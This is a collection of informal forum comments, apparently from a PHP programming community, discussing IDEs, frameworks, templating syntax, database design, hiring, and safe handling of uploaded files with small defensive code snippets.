I just wanted to say thanks for the advice. This was my original assumption, everything would have to be coded. I'd hoped I'd be able to palm some of this work off on those without coding experience, at least the grunt work. Some of my colleagues understand databases, but not the PHP coding. Some kind of GUI that allowed them to create the front end as easily as Excel did would have been wonderful, even if it did need fixing up after, or was only a single step in the solution. Sounds like its all down to me, though; cheers!
Thanks! &gt; I am curious why you're re-creating functionality like substr(), when PHP has native methods to do the same? Actually I'm not recreating any php functionality. I've ported to PHP 3 Javascript methods (indexOf, substring &amp; slice) because this port is based on the Javascript version of the YUI compressor and I wanted to mimic the functionality of those javascript methods so that maintenance through time can be easier. Thanks for your feedback!
Perhaps you could still use this package to script your initial migration away from excel to MySQL or similar? That way you can automate some of the normalization as you port it to over to a real database. 
I'm really impressed by this so far. Is it free?
Don't bitch about how an open-source system is somehow deficient. Get off your ass and write your own kernel.
If you're going to parrot code from outside sources, yes, you need to take responsibility for its quality.
The thing is, your designer is not working with your "Top Sales Widget," hes is working only with the HTML that displays on the client's computer. Allowing the designer to modify how the application works is responsibility-creep in my opinion. Designers decide how it looks and acts, Developers decide how its implemented, and programmers take the idea and make it real. Break that chain and you'll have problems. (Dev/programmer can be one person, but not at the same time.)
&gt; this port is based on the Javascript version of the YUI compressor and I wanted to mimic the functionality of those javascript methods PHP has native functions for all of those Javascript functions. Certainly the compressor would have better performance using the native functions? &gt; so that maintenance through time can be easier Fair enough!
I really like phpstorm, because you can set resource directories. Fx. In your view, which is located fx at View/Index/Index.phtml You add your image to images/foo.png - but phpstorm couldnt find the imags directory in the view folder. Then you set your public folder as a resource directory, and then it finds your images. The same goes with directories, fx autoloader folders and so on. Typehinting also works perfect in phpstorm, both with namespaces and without. I tried it with doctrine1 and 2, zend framework 1 and 2, my own "framework" - none oo projects. Why I think phpstorm is better than netbeans is, that phpstorm is ONLY for PHP (and the things you use on the web, like css, html etc) - Netbeans is more like a java tool, with PHP as a layer on top of that. Yes phpstorm cost money, and netbeans is free - but after that 30 days trial in phpstorm, I just couldnt return to netbeans. But if puremvc uses the DSR-1 standard for namespaces (if its a PHP 5.3x framework) then both netbeans and phpstorm should get your typehinting. And if a typehinting not always work, you can do the magick /** @var $variable \Class\Loader */ $variable = new Loader;
The simplest thing to do would be to learn to build your sites in wordpress. However that may not be the best from a security or performance standpoint. A more advanced track might be learning [pyro cms ](http://www.pyrocms.com/) which in turn might introduce you to the codeigniter php framework which might teach you some better practices than attempting to learn php directly. Many designer types seem to enjoy Expression Engine (also based on codeigniter) but it costs $$ and it is almost too fluid as it doesn't do a very good job of giving you any sort of structure. If you had a solid foundation as a programmer I might say just go for php (probably good to pick a php framework though) but it really is not a very good language to learn with. The saying "the tools we use shape the way we think" is a valid one and php will probably have you all twisted up if you do not have a firm grasp of what you are doing with it. &gt; When using those, do they include inputs or can(or have to) you do that yourself? How about html and styling in css, is that included in a cms? Yes most cms's use the basic html form controls or a template based equivalent. You can write your own html and css, you may want to start with the default template provided by the cms though.
Netbeans is just alright. I use it, but only because it seems to be the most tolerable IDE out of the bunch. The code hinting works well most of the time, but can easily get confused if you have too much inheritance or get "creative" with your code base (e.g. same file names at different paths, or class names not equal to file names). My biggest gripe, though, is that netbeans doesn't see symbolic links, so you want to do a batch upload your sandbox code to a server for testing you'll either lock up altogether or wait a long time for netbeans to realize it's in an infinite loop and backup.
My first inclination was sprintf as well, and out of the three this is by far the simplest, cleanest, and easy to understand.
You don't. If you don't want it being reused that is part of the license. Or in all likelihood it is coded so poorly nobody else can/wants to maintain it :p
This, I'm sold on JetBrains.
Does this /** @var $variable \Class\Loader */ trick work in NetBeans? I can't get it to work or pick up my class.
I've got to say the stuff in that store is some of the worst tat I've ever seen. http://www.cafepress.co.uk/+im_with_stupid_php_dark_tshirt,242135587 - why? http://www.cafepress.co.uk/+mousepad,5262758 - why? http://www.cafepress.co.uk/+php_rocks_dark_tshirt,193600226 - why??? http://www.cafepress.co.uk/+php_mysql_linux_modern_wall_clock,511830402 - it's not even in the right order http://www.cafepress.co.uk/+strategy_pattern_dark_tshirt,240393776 - but... I don't even.... http://www.cafepress.co.uk/+i_went_outside_once_dark_tshirt,208625661 - why does this have random braces at the start and end??
I am just now realizing what this HMVC stuff is all about (thanks to Vance Lucas who gave a talk at Confoo last month). That being said, what you are asking for doesn't need to be built in to any framework you are using. Zend (and many other frameworks) allows you to write View Helpers. What you want to do is write discrete, single-purpose services and inject those into your view helpers. This mitigates the need to dispatch another controller in-process.
(Found [here](http://stackoverflow.com/questions/890128/python-lambda-why) on StackOverflow)
No, it doesn't. /sadpanda
If you want to get into a full stack framework, I would recommend Zend Framework or symfony 2. Both of them will give you a full MVC stack with all the tools you need to build an application. There is a learning curve with both of them so be prepared to learn how they work while you build your app. If you don't want to use a full stack framework, look into using something some of the libraries available on microphp.org and you can put together a decent stack. I like to use Slim for routing, Twig for templates, and idiorm or just straight PDO for the DB. 
i think you need to post this question the forums for the type of web server you're running. see what logging and analysis options are available. if you want to do this in php, you'd have to log each request (filename, session_id, page_request_timestamp). later you can lookup the file sizes and figure out average request, etc. 
View Helpers come close, but don't really offer any good separation of logic and display. Which is one reason why they're often only used for things like semi-complex formatting of data and you don't often see them used for things that need business logic to drive them.
Sorry for the confusion. I didn't mean it wasn't a framework. I meant... more along the lines of comparison to something like.... Cakephp. If that still doesn't make sense. It's me, not you. I'm running on two hours of sleep haha. 
Nope, comparing it to Cake makes sense. Sorry for the confusion!
I prefer Zend Framework, but at the same time I've worked with it for like 2 years. If I was starting today I would look at symfony 2 as Zend Framework 2 still isn't out of beta, and most of the new stuff is going to go to ZF 2 instead of ZF 1. 
That's the thing with reusing other people's wheels instead of just inventing your own. You have to learn what they did, why, and how to avoid breaking it. But you save effort in that they solved lots of tricky problems for you (which is why things get complex). Lots of people using PHP fall into the trap of believing it's easier to code from scratch than learn code that already exists. And they reinvent (or simply don't have) database connection management, input filtering/injection protection, output filtering/XSS protection, localization, translation, file management, database update management, dev/stage/prod workflow... it's a really really long list. Stick with it. If you can learn how to read and utilize other people's code, you'll be very competitive in the PHP world.
It's a blurry line. Where the sales widget appears could definitely be considered "how it looks and acts." Then again, I'll also admit that this idea was inspired by a less than ideal situation. The project was rush, and the designers made move-things-from-page-to-page tweaks while we were still developing. The sheer amount of time we spent moving code between controllers was a nightmare. Everyone (even the client) agreed later that going closer to waterfall and letting the design be finalized first would have worked better. But in that case it would have been nice if we the programmers could have given them a code snippet widget thing that they could have moved between templates without having to worry what controller used that template. The situation I was in was unfortunate, and less than ideal. I doubt that it is that unique though.
One way to get the size of the rendered HTML would be to use [output buffering](http://us3.php.net/manual/en/function.ob-start.php). Example: Start of script: ob_start(); End of script: $html = ob_get_contents(); // Get the contents of the output buffer $renderSize = strlen($html); // Size of string is the HTML size in bytes ob_end_flush(); // Send contents to browser This does not account for the size of additional elements such as externally loaded stylesheets, scripts, or images. If you really wanted to, you could use [filesize](http://us3.php.net/manual/en/function.filesize.php) to get that information. EDIT: Output buffering, not object buffering
That's *output* buffering, btw.
Adding code to each function to make sure its parameters are of the right type seems very tedious. If that's something you need, maybe PHP isn't the right language for your project. 
The problem is not the IDE. I tried a bunch of IDEs for PHP and none of would work in the way Visual Studio or Eclipse/Netbeans with Java do. As PHP is a dynamically typed language, there are plenty of cases where the IDE can't guess the type of a variable (even if you as programmer are "certain" the variable has a type). But then again I use VIM, who needs an IDE.
I've been glancing around, and that subfolder issue seems like a pretty big slipup. I've never seen a script/framework before that has such a problem.
Its not intended to be anything big, basically I want to learn how to develop php extensions, and when I posted my XML parser, some people told to make it a php extension. [here] (http://www.reddit.com/r/PHP/comments/r2vnl/i_have_written_a_replacement_for_simplexml_the/) is the post. 
The *two* people who upvoted that suggestion really don't know what they're talking about. Leave it like it is, promote it, and if-and-only-if you get traction on it, go through the hassle of making it an extension. I, like most professional developers, am absolutely not going to install a random package made by an unknown developer on a production server. Short of that, it's just a toy. Leaving it as a PHP file that people can include means that people might actually read and use your code. A *far better* use of your time would be to write unit tests, and make it a plugin for some of the popular frameworks like Zend, CodeIgniter, or Symfony (my personal favorite).
It seems like the author of this article has misunderstood - `&lt;?=` is now available regardless of the short_open_tag setting (which, as far as I know, shouldn't conflict with XML declaration tags?), not `&lt;?`.
Yes. you are absolutely right. I knew this, but I just want to learn extension development. So just thought it might be a good project to start learning it. 
Agreed, although IIRC if you use PHP via FastCGI/PHP-FPM, nginx will buffer the full client request before pushing it to PHP, so it's a non-issue on sites where it matters (assuming you aren't still running Apache+Mod_PHP on a high volume site, which is idiotic)
It's all about templates, dude. &lt;? is stupid but &lt;?= is great for Views in an MVC framework.
Right. I was agreeing with you.
I completely and totally understand where you're coming from, I just don't agree. In my personal experience, it's a *little* less work but a *lot* less readable (or easy for designers to grok).
This [article](http://www.dreamincode.net/forums/topic/244215-introduction-to-creating-a-php-extension-for-windows/) talks about setting a build environment for Windows. At the very least you'll need [Microsoft's Visual C++ Express Edition](http://www.microsoft.com/visualstudio/en-us/products/2010-editions/visual-cpp-express). You may want to consider writing your first extensions in a Linux environment. It's just easier.
That's why I shouldn't write code comments at two in the morning &amp;#3232;_&amp;#3232;
damn man. In Philly beginning web devs make 60 - 70, sr devs around 90 - 100. Only in Harrisburg do devs get paid in the 40s, and the cost of living there is a joke.
Came here to suggest this very thing. Careful of memory limits though, if your page is very large.
I disagree. &lt;?php echo $user-&gt;name ?&gt; vs &lt;?= $user-&gt;name ?&gt; &lt;?= coincides with most other languages/frameworks and makes sense, IMO. Rails has &lt;%= and &lt;%, Django has {%, Mustache uses {{, Underscore.js uses &lt;%. I don't get why that convention should be broken in PHP
Just because other languages do it doesn't make it good; that's a straw man argument. I'm talking about explicit versus implicit declaration.
Wow... Thats pretty awesome, how many are there like the one mentioned? I'm mostly a python guy so I'm used to having to create my own functs.
Yup, try CodeIgniter. Find some tutorial vids to get started and read a lot user guide at their website.
If you'd read the post I was explicelty asking if anyone had experience with an IDE that works with the PureMVC framework. I've tried Komodo and Eclipse with no luck (no plugin support) and simply was turning to the community to see if anyone had any advice. Obviously you don't, but thanks to anyone else who was kind enough to spare a word or two.
Wait, Shoutcast is still around?
or &lt;? echo '&lt;?xml version="1.0"&gt;' ?&gt;
 &lt;?php if(links_above()){ echo "So putting sayings in code form makes them stylish?"; } ?&gt;
It should work in netbeans. But in netbeans you have to set in after the variable like $var = $foo /** @var $var \Class\Loader */
This shouldn't even be a question. Continue your education for as long as you can. You'll be taken more seriously in potential jobs that pay a lot more.
VIM with Vundle, Pathogen, CommandT, NERDTree, Powerline, Fugitive, Tabular, Surround, IndexedSearch, and SuperTab. You really don't need much more than that. It really is worth the learning curve, you'll pick it up in a day, don't be afraid. :)
You should work Icecast into there as well. It's superior to Shoutcast in several ways imo.
I have not tested how much memory last version of php is using during file upload, so cannot comment this yet. But there are lot of different tasks where trivial php file upload is just the best solution and covers all the needs. Personally I do not see any place for a discussion here. I can agree that there are some tasks where one may even implement separate custom web server for file uploads processing. But overall it is very good that file upload progress can be tracked via php now.
Actually php has a buch of tools for advanced XML processing - DOM, XML Parser, XML Reader, XML Writer. I think they can be even faster (not sure - have not compared the speed). But even when I have used short tags for Atom feed generation, I do not remember that I had any problems with it... I think one just have to remember and understand what he is doing and why this way. Language just provides certain tools...
Read my second comment and you'll see that that doesn't help. If you're handling XHTML in templates it'll mess you up invariably.
Im not rely sure if it works in netbeans - But I had it to work with namespace in netbeans, havent tried with no namespace. But it works flawless in phpstorm :)
Use a 'viewable' table instead. CREATE TABLE `viewable` ( `postId` INT NOT NULL, `userId` INT NOT NULL, PRIMARY KEY (`postId`, `userId`), KEY `userId` (`userId`) ) Then insert each pair into the table individually. 1, 1 1, 17 1, 29 1, 14 1, 82 1, 942 1, 332 1, 91 Then you can just `SELECT postId FROM viewable WHERE userId = xyz` to see which posts a given user can view Or `SELECT userId FROM viewable WHERE postId = xyz` to see who can view a particular post.
Having many values inside one field is bad design, you should look into database normalization. Basically you would want a new table with [postID, viewableUserID] and with as many rows for each post as you need. Then you'd just select for rows where viewableUserID = foo. That's the simple restructuring, but something else might be better if we knew your whole db structure.
Subqueries are BAD. In terms of performance, this won't go down well because the subquery would need to be executed for every post. Assume 10,000,000 posts. That means 10,000,000 executions. It comes down to the underlying database engine and I'm sure by now it's not that bad, but still should be avoided. Use a JOIN instead. (Google for something like 'rewrite subqueries as joins')
Also spot on :)
No I'm not mad, I'm using it. It should however be in a package, not in the core language.
Hiring manager of a primarily-PHP shop here. In the 7 years I've been choosing candidates, I've never given preferential treatment to someone based on what degree they hold - I *only* care whether or not they have the experience in the field and know how to do the job. The vast majority of college graduates don't actually know how to program, and are useless in the dev world. I certainly don't have the time to teach them. Even if you do decide to continue with your education, spend the time outside of class working on your own independent projects, learning everything you can, and following the most current trends you can find. That's going to pay off more in the long run for you.
I've been on the hiring end long enough to find that every self-taught gamble has resulted in failure because they didn't have a clue in some foundation concepts. We've been burned too many times, so now nobody gets considered without that expensive piece of paper. I do look specifically for the hobbiest aspect. It's the most important thing to me really, but the degree is prerequisite.
What 'foundation concepts' were they missing? I've been with PHP for 16 years, and with software dev a bit longer than that, and haven't yet found a correlation between someone's skill as a developer and their education background. Some of the best devs I know have degrees in music, philosophy, english, etc., and I know some great devs with solid engineering or CS backgrounds. But I've still not seen any pattern or correlation or causation in that time. A couple weeks ago I met up with a guy who's finishing a web development degree - nice guy, earnest, hard working, and I think he'll do OK. But while he's been exposed to PHP, it's been *only* mysql - no PDO drivers. No clear separation of concerns in the code (php/html/mysql in one file). No version control concepts. No concept of a repeatable/scriptable build process. No overview of testing concepts - automated or manual tools. This is specifically a *web development* program in *2012* that is giving people 'degrees' without so much as exposing them to the fundamentals of things that developers *should* have a grounding in. I see *these* as 'foundation concepts' I'd want a software developer to have had some exposure to. Whether they understand the ins and out of Java threading, memory management in PHP vs Ruby, SQL indexing optimizations, etc - those are good to have, for sure, depending on the job/role. The others I mentioned are (seemingly) shockingly absent from some degree programs. The syntax of PHP is changing every couple years - the need for testing, version control, repeatable build processes, documentation, etc - these needs don't really *change* so much as simply get stronger over time.
I second this notion. I only took 1 computer science class in college and quit, because I was tired of the professor debugging and fixing his short code snippets during the lectures! Yet I've had a [pretty awesome career path](http://users.phpexperts.pro/tsmith/) since. One of my favorite hobbies is mentoring people on "foundational concepts" most people miss when they're self-taught and have to find out the hard way. You can find more info in that link above.
I work for a place that hosts SHOUTcast servers. Paid for most of my first year of university.
If I understand you right then the = makes it explicit. If you see &lt;?= there's no other option than "echo the result of the following".
Proficient with Bash? It'll be a piece of cake. Learn the [string](http://php.net/manual/en/ref.strings.php) and [array](http://php.net/manual/en/ref.array.php) functions and the [object model](http://php.net/manual/en/language.oop5.php) and you're halfway there.
Wow! I've never used codespy but it looks super helpful for debugging. Thanks!
I just worked my way through [Larry Ullman's PHP for the Web](http://lifeandcode.tumblr.com/post/19480075787/review-larry-ullmans-php-for-the-web-a-beginners) and liked it a lot. That's a beginner's book, though, and if you find it too basic, his followup, PHP for Dynamic Websites, might be a good choice. 
You are welcome. its actually meant to compliment unit testing, to measure code coverage of your unit tests. 
Clean PHP by Sebastian Bergmann...as of this writing page results in a "Error establishing a database connection" It looks very clean though...
If you have java installed, try the [Yui Compressor](http://developer.yahoo.com/yui/compressor/).
they're all binaries. google it ;)
After RingTFM [as suggested](http://www.reddit.com/r/PHP/comments/rc9dg/looking_to_learn_php_suggestions/c44n4bz), you'll want to leverage your DBA background. Learn [PDO](http://php.net/pdo) *before* learning any of the database-specific interfaces.
headzoo hit the nail on the head. That's at least A problem, though it might not be your ONLY problem in this case. For the future though, you have two things I'd consider the most major for you to learn (I know you said that you were new, so hopefully you take this as constructive): 1) Naming 2) Spacing Naming: Why is that variable called $Fixit? It starts with a capital letter, unlike anything else, and even after headzoo made me look closer and see where $Fixit was set, I still have no idea why you chose that name. It's the result of the query, Name it something like $results. I see that you apparently do have a variable named $results, but I can't for the life of me find where that's set, which leads me to Spacing: One statement per line. Things like $rowsperpage = 2; if(isset($_GET['page'])) { $pagenum = $_GET['page']; }else{ $pagenum=1; } should be closer to: $rowsperpage = 2; if (isset($_GET['page'])) { $pagenum = $_GET['page']; } else { $pagenum = 1; } The exact syntax is up for debate, and people have their own preferences, but shoving as much as you can fit on a single line just makes it very hard to find what you're looking for. It took me far too long to find where $Fixit was being set to sanity check the answer by headzoo, and I STILL can't find where $results is being set.
I agree. Op, I've reformatted your file. This is how it should look like. http://pastebin.com/ZeeRy0wF Also look at line 49-60, this is how you mix html with php code. 
It's funny how requirements often determine code quality...in achieving those requirements. I'm a little puzzled by the count($cmd) checks. executeCommand could be split up by command type. This makes it a lot easier and clearer in determining and modifying behavior. Who cares if count($cmd) == 1, if $cmd[0] == "Exit"? If you're in doExit, it's over, right? Be it 1 or 20 commands. foreach($cmds as $cmd){ switch(true){ case $cmd == "MOVE": $this-&gt;doMove(...); break; .... } }
I use [node-jsmin](https://github.com/pkrumins/node-jsmin) and [node-cssmin](https://github.com/jbleuzen/node-cssmin).
Actually, icecast is automatically supported by libshout. So yeah, that should function too.
The best course for me was at www.killersitesuniversity.com ...super fun and easy to learn
Thanks for taking the time to look over my code :) &gt;I'm a little puzzled by the count($cmd) checks. &gt;Who cares if count($cmd) == 1, if $cmd[0] == "Exit"? That's true. I was being pedantic with command use, so that anything not exact would trigger the invalid command clause and force the user to check the command list. Do you think the parsing of the PLACE command could be tidied up? Also, any suggestions for a practice application (front end / CLI)? **EDIT**: replied with another account, my bad :P
I really hope someone mentions the vulnerability of putting $_GET or $_POST directly into a SQL query. Even if it's sent by another script, it's just good to be paranoid when it comes to injection. Everything else seems to have been covered, good luck!
All posts get some downvotes. It's either automatic or some bot. Don't worry about it!
It's what I use and since everything is in python it is easy to edit/add functionality (compared to say notepad++ which is written in C++).
1) If a function seems long, it's too long: Function *executeCommand* is simply huge. Don't be afraid to simply refactor code when its purpose has been achieved, you most likely have a set of test files of input and expected output: if($cmd[0] == "PLACE") $this-&gt;placeCommand(); else if($cmd[0] == "MOVE" &amp;&amp; count($cmd) == 1) $this-&gt;moveCommand(); .... 2) When deciding which actions to do, the commands themselves should be constants: if($cmd[0] == self::PLACE_COMMAND) .... 3) $cmd[0] should be a variable. It's a moot-point, but when someone else looks at your code, it's obvious at the start of the 'if-chain' what $cmd is, but in the context of later if-statements the reader has no frame of reference. This is maintainable. 4) Using double-quotes when declaring a string will be a performance hit, if you do not need any variables to be resolved. Use single-quotes instead. Overall your coding seems sound and your coding-style is good. Here are some design suggestions or extensions you might want to look at: * Should *terrain* restrictions be in Robot.php? * How would you simulate if the Robot was moving against the wind? * What happens when the client says they want to add a new command every few days? Is a 10+ if/else chain going to be maintainable? * https://en.wikipedia.org/wiki/Visitor_pattern
sprintf is rather frowned upon in the modern world since it's harder to read - he really should just go ahead and use PDO's prepared statements anyway. And that [doublequotes-vs-singlequotes issue](http://classyllama.com/development/php/php-single-vs-double-quotes/) hasn't been true for a long time. 
Perfect for debugging my coworkers' code which are sometimes 200+ characters! 
What the hell is an advanced diploma?
Yo. PM me and let's see what we can I about your problem.
wow, hideous code.
The best addition is traits.
Buy your full name .com domain name, and start using it as a portfolio and resume. I know you're looking for places to look for a job, but having something like that is an invaluable tool when applying; making it so an employer simply has to go to one place to find basically everything he/she needs to know will make you a much more attractive candidate. And keep coding!
Actually it didn't seem to bother him. He just said "yeah, I haven't been bothered to fix that" in the interview. (look of disapproval)
I think all the comments favour degree man, krues8dr seems to be the outlier, phpexperts website is SHIT. that alone should render his opinion useless. mgkimsal thinks like we do. there's no fucking difference, but doesnt realize that that the HR guy at a major company WONT have a degree in programming and wont understand that concept, he'll filter out possible candidates by going; high school = garbage college + experience = might garner taking a look at... if no degree applicants apply and then degree applicant + experience = interview worthy im not saying you wont find work, if you want to make your own company it would hardly matter, but in the end, the degree will get you more jobs and a slightly higher paying job sooner.
Must of been good to be one the other candidates there! Group interviews are interesting. I've done a one-on-one interview with a PwC partner and it was less stress than a group one I did. 
Thank you for that tip. I'll do my best to demonstrate starting and finishing my projects. My major requires we do a lot so I'll have great examples.
This was what I was going to say. Use variable names that give us a clue as to what it might contain. 
I can sympathize with him. Sometimes you have more important things to fix than your personal blog.
True but "Down for Maintenance" would be infinitely better than "parse error on line 21 in file index.php" :D
Certainly Iunderstand that nginx is a religion, but I have used Apache several times and find it quite cool web server. It just had to be configured properly. Personally I preffer lighttpd, but should admin that Apache is cool. Regarding the memory consumption by the php script, I believe that if php script requires more than 4MB of memory it should be rewritten (at least in 99.99% of cases). At least I am defining this value in php.ini and increasing it only when do not see any other wayto solve the problem (almost never). Again it is only my opinion that is based on my experience and I do not want to change someones mind.
&gt; None of us really knows what we're doing That's actually extremely comforting.
Actually you can be right, but I do not see thetasks that cannot be solved without it... Probably that is just a habit and my opinion will change once I will try it out :D
Which is actually pretty nice in general sometimes. [Plus, no `;` needed](http://php.net/manual/en/language.basic-syntax.instruction-separation.php) for things like `&lt;?= 'blabla' ?&gt;` for short and quick echos throughout a template. The only catch is whether your IDE recognizes that form. Also, probably won't come up that often with this form, but do keep in mind [PHP comments](http://php.net/manual/en/language.basic-syntax.comments.php).
You know nothing, Php Snow.
Yeah, writing a new language that compiles to PHP code does seem odd, doesn't it? If it compiled to many languages, then it might have something going for it, but really its just a new way to write PHP, that has to be compiled, and doesn't appear to solve any issues.
Check out AuthenticJobs.com too. They have a lot of freelance work from anywhere jobs.
*Compiles* to PHP? My head hurts now.
This uses gnome seed, email me if you need help using it http://www.roojs.com/index.php/View/194/.html This is a usage example for building the extjs 1.0 fork I maintain look at bundle_build.sh http://git.roojs.org/?p=roojs1;a=tree;f=buildSDK;h=e6d5a4a04531837917b3c853a658103549aed7da;hb=HEAD This is probably of less interest , its the php code for my framework that calls it, and compiles the Javascript and CSS on the fly http://git.roojs.org/?p=Pman.Core;a=blob;f=JsCompile.php;h=fbd94f662d8d8b3e150501422c7964029f0546f9;hb=HEAD
For learning extension development, the easiest way is to wrap library X. So trawl around for a cool application that exposes a C (but not PHP) api, or a C library that does something interesting. For example, a C-based IRC communication library, write a PHP extension to wrap that and provide it as objects. Etc. etc.
Just as JavaScript doesn't need coffeescript, PHP does not need Snow. I really hope this doesn't result in the same crap that JS community has to put up with now... Snow libraries being passed off as PHP code.
Groovy is good for Java. This is not good for PHP 
Grumpy's guide is one of the best guys to follow on Twitter for PHP testing, and his book is nothing short of excellent.
Python also makes you pass self as a paramter. It's like PHP but worse.
Thanks for those two suggestions, I will bookmark those links!
Still doesn't bother me one bit, especially when my IDE does all the work.
Thank you very much for your feedback! Over several commits, I've added constants (both commands and arguments) and changed $cmd[0] to $command for clarity. Next on the list is breaking up the executeCommand function and fixing up single/double quotes (hopefully using the right type of quotes in different contexts will come more naturally if I remind myself of the implications). Once that's done, I'll have a crack at your design/extension suggestions :)
I'll be living 30 minutes outside of Atlanta and the demand for tech/business oriented people is really growing. I was considering learning c++ since I've heard a lot of server systems will run programs built in it, but do you suggest just going to c# instead?
The description you provide sounds really good. And I would be comfortable paying that price for it. Maybe you could provide a sample chapter? Or at least link to some other written work (tutorials, articles, ebooks) or PHP projects you are involved in?
Perhaps I'm missing something, but `this` is a core part of JavaScript and ActionScript. I'm pretty sure most OOP variants of BASIC use the term `this` or `self` as well, although they also scope to the current object, so you only need it if accessing a member property that's the same name as a local variable.
Sounds like you're on the right track. Keep learning and make some stuff to show off and you probably won't have many issues getting jobs.
Just bought your book. One suggestion, which this might be LeanPub and not in your control but on http://leanpub.com/grumpy-testing -- The "buy" button makes me think I'm only going to get one file-type, since I can hover + push them independently. It'd be nice to know ahead of time that you do indeed get all 3 formats.
&gt; so you only need it if accessing a member property that's the same name as a local variable. That's kind of the point. There are times when you *have* to use this, but you shouldn't be forced to use it when there are no name conflicts with local variables.
&gt;and LESS LESS runs through JavaScript. You can run it directly in the browser, or compile it to CSS via the use of node.js or similar. 
I know but I have hit bugs with in-browser LESS compilation. But I think with LESS the issues are not that big, yet it would be so much better to standardize LESS features directly in CSS.
Thanks!
What is it you want to do, specifically? File format identification or file format validation? Just to be clear.
Mime type validation is good for making sure the files are in the right format and the user hasn't accidentally submitted the wrong file, but it won't protect you from a malicious user who may upload a word doc containing an embedded trojan/macro or a virus laden file with a modified mime type. If you're *really* paranoid then convert the uploaded file to text using the "catdoc" utility like so: function func_word2text($filename) { $wordcontents = system('catdoc '.escapeshellarg($filename)); return $wordcontents; } Just make sure catdoc is installed on your server.
&gt; but that can easily be forged? Yes, the mime-type is sent by the browser, not determined on server. If you can exec UNIX commands on the server, you can try `file`, as in: btm@serv72:~$ file skipfish-2.03b.tgz skipfish-2.03b.tgz: gzip compressed data, from Unix, last modified: Thu Aug 4 18:54:48 2011 
Apply for trainee/junior positions. You'll have take a massive pay hit at first, but the company will train you.
The file extension, mime type, and even the signature used by fileinfo (which is more reliable than extension or mime type) can easily be fooled. If I wanted to be sure that PDFs sourced from the Big Bad Internet and handed off to trusting, naive internal users were legit, I would run them through GhostScript with just enough of a transformation applied that it had to rebuild the file. I suppose there's probably still ways to embed evil payloads in the various blob datatypes that PDFs can contain; perhaps GhostScript has ways of whitelisting blob types that it can validate and/or rebuild (e.g., JPEG, etc.). My internal users don't use Adobe's PDF viewer so there's a little less risk that way; the readers they use (Mac and Linux) aren't quite so all-singing, all-dancing, so they have less attack surface. For Word documents I think it's almost impossible; you will need to rely on the antivirus software installed on your internal users' PCs. Good luck with that. I never accept Word documents; it's a minefield.
Be very careful, though. You don't want a user to be able to send a bad file name that runs a shell command. That's how that online election site was recently compromised.
PHP has the fileinfo extension which does the same thing. But it's not useful for identifying malicious attacks, only innocent mistakes.
Well, yeah, I partly agree. But as I have this problem with Netbeans in my PHP projects, I think, the PHP folks here may have the same problem, so 1) they know a solution and 2) it could be interesting for other PHP coders, too. I mean, an IDE is part of the whole process, right? Additonally, I see other posts in this subreddit which belong to Netbeans or other tools, so ...
http://svn.agavi.org/branches/1.0/src/validator/AgaviBaseFileValidator.class.php
But surely we have unit tests so we can pop it in another environment and check that the code objectively "works"?
Well, an attack code doesn't magically execute on its own. It needs to either be written in some kind of macro language, or dump instructions into memory via an exploit (e.g. a buffer overflow). In both cases, the file format would need to be valid (or valid enough to be accepted by the parser), so I doubt parsing the file would save you. For instance, in the case of Word files, the attack code would be written in Word's own macro language, which still makes a perfectly valid Word file. A better route to go would probably be scanning the files for malicious code, e.g. via [clam](http://php-clamav.sourceforge.net/) or similar. 
I agree with you, and normally I would remove jasonamyers' types of comments, but I am going to leave this one because I want people to see how they are trying to sell this.
How's the book? You probably haven't had a chance to go through all of it yet, but a review here would be appreciated.
beanstalkd + pheanstalk. Nothing simpler exists. And you probably don't want to do calculations in PHP anyway.
(Author here) I know Jason through Twitter, so it's not some sock puppet account being created to pump up my book. If you don't want to buy the book because of that, it would make me sad but that is your choice to make.
I purchased this book a couple weeks ago and the parts I've read have been well written IMO. I haven't read it as in depth as I have wanted or completely yet though.
This. We're currently having the problem of slightly different php/phpunit-versions on the production-servers, developer-vms and the ci-server and it leads to problems where tests fail, despite being wirtten correctly. This frustrates dev's because builds fail and it could lead to the point where they don't want to write tests anymore.
guess my 5 year old account makes me credible then? What other conspiracy theories are you guys into?
Everyone always recommends gearman, and while it is certainly functional, I don't really like how it works. It could just be lack of familiarity with it though. I prefer using rabbit-mq and [PhpAmqpLib](https://github.com/videlalvaro/php-amqplib) although the documentation isn't amazing, you can figure everything out from reading documentation on rabbit-mq. You can/should always checkout [stackparts](http://stackparts.com/) if you're looking for a technology you think probably exists. Edit: fixed links, i always reverse [] &amp; ()
Thanks, I was looking for a good php client for beanstalk a while ago and didn't find this.
Wow, yeah, that's not at all how it is supposed to look. Looks like the external stylesheets aren't loading. If you could open Developer Tools (F12) and click Network and screenshot that so we can see what is going on? You might also want to check the console.
What he's referring to are apps that are designed to be portable - ie a framework that doesn't only run on a single prod environment, but is downloaded and run on thousands of different servers by different people.
Before I start reading this, *thank you* for posting it. I've been looking for a good intro to Jenkins for a little while. Nearly ended up buying a book.
I could be wrong, but you could probably write your foreach loop like this: $stmt = $db-&gt;prepare("INSERT INTO transactions (TRNTYPE, DTPOSTED, TRNAMT, FITID, NAME, MEMO) VALUES(?, ?, ?, ?, ?, ?)"); $stmt-&gt;bind_param('ssssss', $trans['TRNTYPE'], $trans['DTPOSTED'], $trans['TRNAMT'], $trans['FITID'], $trans['NAME'], $trans['MEMO']); foreach ($parsedData as $trans) { $stmt-&gt;execute(); } Note that I'm calling bind_param() ***outside*** of the loop. The reason for that is PHP binds the variables *by reference*. Each time you call execute() PHP will look at the new values inside $trans. Take a look at the first example on [this page](http://us2.php.net/manual/en/mysqli-stmt.execute.php). Once the variables have been bound to the statement, you *don't* call bind_param() again when the variable values change. You just call execute() again.
It might be internet connection error, try reloading site 3-4 times rapidly 
He's offering a book for $5.90. I can verify you get a 60 page book filled with content. I haven't read it yet but I'm going to say that, for the price, it's a pretty minimal risk. It's not a scam. Support the author or don't, but don't go ruining it for others.
Which would you suggest? And do you maybe know how to set it up?
Yup, I follow him on twitter too, along with a few other PHP devs. It's good to see what projects/talk is going on in the PHP world. It helps me realize that I'm not alone in my own personal dev hell.
You need to use IPN (Instant Payment Notification). Basically when some pays on your site, PayPal will invoke a script on your server, pass it the details (amount, currency, email address, etc). Your script can then make changes to the user's account on your database. PayPal has some code examples on their web site.
Been using this method to handle 30k uploads a day for 3 years now without a problem. Just wanted to add that using the -ib switch makes the output a bit easier to parse: Command: file -ib somefile.zip Output: application/zip; charset=binary A function for using the command could be: function getFileMimeType($file) { $cmd = "/usr/bin/file -ib " . escapeshellarg($file); $result = exec($cmd, $output, $code); if ($code !== 0 || !$result) { throw new Exception("Unable to determine mime type for file '$file'"); } $parts = explode(';', $result); return $parts[0]; }
